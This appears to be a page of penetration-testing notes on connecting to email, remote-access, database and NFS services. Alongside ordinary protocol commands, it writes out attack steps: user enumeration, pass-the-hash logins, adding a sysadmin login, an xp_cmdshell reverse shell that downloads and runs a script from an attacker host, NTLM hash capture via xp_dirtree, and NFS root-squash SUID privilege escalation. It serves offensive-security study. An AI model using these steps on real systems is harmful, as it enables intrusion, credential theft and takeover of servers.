---
sidebar_position: 3
---

# Using common services

## Email

### SMTP

SMTP usually runs on port 25, 265(ssl), and 587(ssl), but of course it could run on any other port. If you find a port running SMTP, you can connect and login to it using:

```bash
# connecting
telnet <IP> 25

# authenticate with username password (will be prompted)
AUTH

# Tell the server your domain name
EHLO <domain>   # ex: EHLO the-nest.com

# to send a letter, ex: from crystal to steven
MAIL FROM crystal@the-nest.com
RCPT TO steven@the-nest.com
DATA
....type your stuff here....
EOF     # to indicate that your message is completed
```

You don't always need authentication to use the SMTP service, so it's likely that you can send emails or issue other commands without valid credentials.

You can enumerate usernames with some commands:

```bash
# VRFY
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown

# EXPN
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>

# RCPT TO
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

### POP

POP usually runs on port 110 and 995(ssl). It allows you to fetch and retrieve emails. The messages arestored on the client machine and deleted from the server. 

The basic commands are:

```bash
# connecting
telnet <IP> 110

# login
user <username>
pass <password>

# get capabilities
capa

# list emails
list

# read emails of index
retr 1  # first email
retr 2

# delete emails of index
dele 1

# exit and close connection
quit
```

### IMAP

IMAP uses port 143 and 993(ssl). Similar to POP, this service allows you to retrieve received email. Contrary to POP though, you aren't downloading or storing messages to your system. You're actually reading the information from the server itself, so this protocol allows you to access your mails from multiple devices simultaneously.

The basic commands are:

```bash
# connecting
telnet <IP> 143

# login, use quotes around strings if it contains spaces of othe special chars
A1 LOGIN <username> <password>

# list folder and mailboxes
A1 LIST "" *
A1 LIST INBOX *
A1 LIST "Archive" *

# create/delete folders/mailboxes
A1 CREATE INBOX.Archive.2012
A1 DELETE "To Read"

# select mailbox
A1 SELECT INBOX

# list messages, FLAGS can be defined for mailboxes and will be given from SELECT command
# system-defined flags are: Seen, Answered, Flagged, Deleted, Draft, Recent
A1 FETCH 1:* (FLAGS)
A1 UID FETCH 1:* (FLAGS)

# Retrieve Message Content
A1 FETCH 2 body[text]
A1 FETCH 2 all
A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

# close mailbox
A1 CLOSE

# logout and close connection
A1 LOGOUT
```

## Remote Access

### RDP

RDP by default runs on port 3389 and is a windows service.

To connect, I use `xfreerdp` since it's installed in kali by default and is pretty fast.

```bash
# use -sec-nla if necessary
xfreerdp /u:user /p:password321 /cert-ignore /v:10.10.178.149

# with domain and hash
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>
```
### WSMAN

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. It's usually in a higher port(5985, 5986), so if you don't run `-p-` nmap by default will not find it since it's not in the top 1000 common ports. But if you have creds this gives an awesome shell!

For WinRM hacking, use [evil-winrm](https://github.com/Hackplayers/evil-winrm).

Usage:
```bash
# powersploit in /usr/share/windows-resources/powersploit/Exfiltration

# if you want to load powershell scripts, supply the -s option
evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\chase -s ~/pshs/ -p 'Q4)sJu\Y8qz*A3?d'

# if you want to load executables, supply the -e option
evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\chase -e ~/execs/ -p 'Q4)sJu\Y8qz*A3?d'

# you can upload/download any files inside shell
upload <filename>
download <filename>
```

## Databases

### MSSQL

Microsoft SQL Server is a common database server running on port 1433. For a mapping of versions to Windows version, see CREST notes.

**Information taken from [Hacktricks - Pentesting MSSQL](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)**

The default MSSQL system tables are:
* master Database : system-level information for this SQL Server
* msdb Database : for scheduling alerts and jobs
* model Database : the template for all databases created on this SQL Server. The modifications apply to any databases created afterwards.
* Resource Database : read-only database with default system objects. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
* tempdb Database : work-space for holding temporary objects or intermediate result sets.

The high-privilege database user is `sa` which has admin rights. Since the user running MSSQL will probably have SeImpersonatePrivilege, try JuicyPotato once you have cracked his password with John for privesc.

You can connect to MSSQL with `mssqlclient.py` from the `impacket` package, `sqsh`, or `crackmapexec`:

```bash
# mssqlclient
mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth

# sqsh
sqsh -S 10.11.1.31 -U sa -P poiuytrewq -D bankdb

#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"

#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

Some basic commands include:

```sql
-- see version
SELECT @@ version;

-- see permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- query data
use <db-name>;
SELECT name FROM sysobjects WHERE xtype = 'U';

-- Here's a workflow from hacktricks
-- Get databases
SELECT name FROM master.dbo.sysdatabases 

-- Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;

-- List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;

-- List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

-- Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```

You can run commands by enabling `xp_cmdshell`:

```SQL
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

-- run command
EXEC master..xp_cmdshell 'whoami'

-- run reverse shell, remember to host file
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<IP>:<port>/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

You can also try to trick the database into performing NTLM authentication to our server and catch the hash with responder of your SMB server.

```SQL
-- directly
xp_dirtree //10.10.14.3/kali

-- or
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
```

## Others

### NFS

The following notes taken from [HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)!

**NFS** stands for Network File System and usually runs on port 2049. It is a client/server system that allows users to mount shares to a local directory across a network and access files. If you run nmap with nse scripts, it will often give you the NFS exports and permissions.

The config files for NFS are `/etc/exports` and `/etc/lib/nfs/etab`

To mount:

```bash
# check which folders are available
showmount -e <IP>

# mount! (for linux)
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock

# for example, when NFS is running on non-default port
sudo mount -t nfs 127.0.0.1:/srv/Share /tmp/pe -o port=7777

# allow read write and specify version, ver 2 doesn't have any auth!
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

# mount to Windows dir
mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
```

:::tip My tip

If the folder contains files or folders only accessible by some user or UID, just create a local user with that UID then you can access the files!

:::

#### PrivEsc

If any directories on the server is configured as **no_root_squash**, it means you can access the folder and write files as root if you were local root on your client machine.

* **no_root_squash**: root user on client can access files on NFS server as root. (Otherwise you should be 'nobody') 

* **no_all_squash**: similar to no_root_squash but applies to non-root users. You can create suid files as a target user, execute as nobody and elevate to different user.

**Remote exploit**

Copy SUID binary to mounted folder as root, then execute from victim to get shell.

```bash
# Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

# OR, use SUID payloads 
gcc payload.c -o payload
cp payload .

# Victim
cd <SHAREDD_FOLDER>
./bash -p # ROOT shell
```

**Local exploit**

Sometimes the `/etc/exports` may explicitly whitelist IP addresses, so you have to exploit locally as a low-privileged user.

> NFSv3 specification mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!

The exploit library can be found [here](https://github.com/sahlberg/libnfs)

1. Compile the exploit (might have to tweak depending on kernel)

    ```bash
    ./bootstrap
    ./configure
    make
    gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
    ```

2. Write and compile your own exploit

    ```bash
    cat pwn.c
    # int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
    gcc pwn.c -o a.out
    ```

3. Place exploit on share and make it suid root by faking RPC calls with the exploit library

    ```bash
    LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
    LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
    LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
    LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
    ```

4. Launch attack by executing file on victim

